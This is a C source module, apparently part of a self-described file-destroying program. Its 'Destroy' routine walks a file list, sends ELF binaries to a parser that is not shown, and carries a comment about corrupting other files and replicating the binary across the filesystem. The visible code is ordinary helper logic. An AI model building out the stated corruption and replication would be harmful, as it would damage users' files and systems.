// Author : Abhinav Thakur
// Email  : compilepeace@gmail.com

// Description : This module contains the miscellaneous routines


#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include "color.h"
#include "operations.h"



unsigned long int elf_count = 0; 



// Parses the FileList, checking the filetypes and perform actions accordingly  
void Destroy(FileList *start)
{
	fprintf(stdout, SIGNATURE);

	FileList *ptr = start;


	// Parse FileList
	do
	{
		if ( IsELF(ptr->name) )
		{
			++elf_count;
			// [DEBUG] fprintf(stdout, GREEN"[%ld] ELF"RESET" : %s\n", elf_count, ptr->name);
			ElfParser(ptr->name);
		}
		
		else
		{
			//fprintf(stdout, BLUE"[+] Regular"RESET" : %s\n", ptr->name);
			// corrupt files and replicate binary to FS
		}

		ptr = ptr->next;	

	} while (ptr != NULL);
}



int log_heading_set = 0;
int log_footer_set = 0;
// Returns True if file is an ELF binary
static int IsELF(char *file)
{

	// Open file in read mode
	int fd = open(file, O_RDONLY);
	if (fd == -1)
	{
		return 2;
	}

    // Read Magic bytes (first 4 bytes of file) - 0x7f 0x45 0x4c 0x46
	char magic[4];
	int bytes_read = read(fd, magic, 4);
	if (bytes_read != 4 )
	{
		close(fd);
		return 0;
	}


	// MAGIC_ELF defined in <operations.h>
	if (strncmp(magic, MAGIC_ELF, 4) != 0)
	{
		close(fd);
		return 0;
	}


	// Prevent resource leakage
	close(fd);
	return 1;
}



// Returns a joined string (path + name) 
char *GetAbsPath (char *path, char *name)
{

	// Plus 2 because of a '\0' (string terminator) and a '/' (placed in between both paths)
	int pathname_length = strlen(path) + strlen(name) + 2;


	// Allocate and clear out memory of 'pathname_length' no. of blocks, each block is 1 byte in size
	char *pathname = (char *)calloc( pathname_length, 1);
	if (pathname == NULL)
	{
		fprintf(stderr, RED"[-]"RESET" mics_routines.c : GetAbsPath -> calloc\n");
		exit(0x40);
	}


	// Concatenate the directory name after location (provided as input to DirEntriesParse()
	strncpy(pathname, path, strlen(path));
	
	if ( *(pathname + strlen(pathname) - 1) != '/')
		strncat(pathname, "/", 1);
	
	strncat(pathname, name, strlen(name));


	return pathname;
}
